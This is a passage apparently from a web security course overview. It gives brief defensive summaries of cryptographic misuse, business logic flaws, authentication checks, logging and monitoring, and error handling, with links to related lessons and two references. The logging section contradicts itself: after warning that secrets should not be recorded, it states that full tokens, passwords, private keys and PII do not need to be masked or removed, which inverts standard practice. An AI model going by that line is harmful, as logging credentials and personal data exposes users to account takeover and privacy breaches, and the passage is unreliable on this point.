Crypto failures often do not lie in a custom algorithm alone, but in how it is used: transmitting sensitive data unencrypted, using TLS incorrectly, predictable random, reusing nonce/IV, hashing passwords with a fast hash, or not rotating keys. Baseline defense: mandatory TLS, passwords use Argon2id/bcrypt/scrypt, secrets generated with CSPRNG, AEAD for data requiring integrity and encryption, keys stored in a secret manager instead of in the source.

## Business Logic

> **Related Lessons:** [Business Logic Vulnerabilities](06-insecure-design/business-logic-vulnerabilities/), [Race Conditions](06-insecure-design/race-conditions/), [API Rate Limiting](11-api-security/api-rate-limiting/).

Business logic is a process error that scanners find difficult to detect: using coupons multiple times, changing states in the wrong order, modifying prices on the client side, bypassing limits, race conditions, or performing actions not in accordance with business roles. Retesting must be based on clear invariants, for example, non-negative balances, each code used only once, order status only following a valid state machine, and all critical steps checked on the server.

## Authentication outside JWT

> **Related Lessons:** [Password Mismanagement](07-authentication-failures/password-mismanagement/), [2FA/MFA Bypass](07-authentication-failures/2fa-mfa-bypass/), [Session Fixation](07-authentication-failures/session-fixation/), [OAuth Vulnerabilities](07-authentication-failures/oauth-vulnerabilities/).

Besides JWT, it is necessary to check the password, session cookie, MFA, reset password, OAuth/OIDC, and anti-enumeration. Short checklist: rate limit by account/IP/device, consistent login error messages, session id rotates after login/privilege change, cookies `HttpOnly`, `Secure`, `SameSite` are appropriate, MFA attached to the session and recovery code is managed as a secret.

## Logging & Monitoring

> **Related Lessons:** [Logging and Monitoring](09-logging-alerting/logging-and-monitoring/), [Information Leakage](06-insecure-design/information-leakage/), [Error Handling](06-insecure-design/error-handling/).

Good logging helps with investigation but secrets should not be recorded. There should be events for failed login, privilege changes, access denials, validation errors, rate limits, configuration changes, and financial/sensitive actions. Each event needs a timestamp, actor ID, request ID/correlation ID, source, policy result, and a stable error code; full tokens, passwords, private keys, and PII do not need to be masked or removed.

## Error Handling

> **Related Lesson:** [Error Handling](06-insecure-design/error-handling/), [Information Leakage](06-insecure-design/information-leakage/), [Lax Security Settings](02-security-misconfiguration/lax-security-settings/).

Safe error handling separates messages for users from internal details. The client only receives stable error codes and brief handling guidance; internal logs retain stack trace/correlation id as needed. Do not return SQL errors, internal paths, framework versions, secrets, tokens, cloud configurations, or data of other tenants. For authentication, use uniform messages to reduce user enumeration.

## References

- **[S1]** CWE-120 — Buffer Copy without Checking Size of Input. https://cwe.mitre.org/data/definitions/120.html — current version; accessed: 2026-07-18.
- **[S2]** pwntools Documentation — cyclic patterns. https://docs.pwntools.com/en/stable/util/cyclic.html — current version; accessed: 2026-07-18.
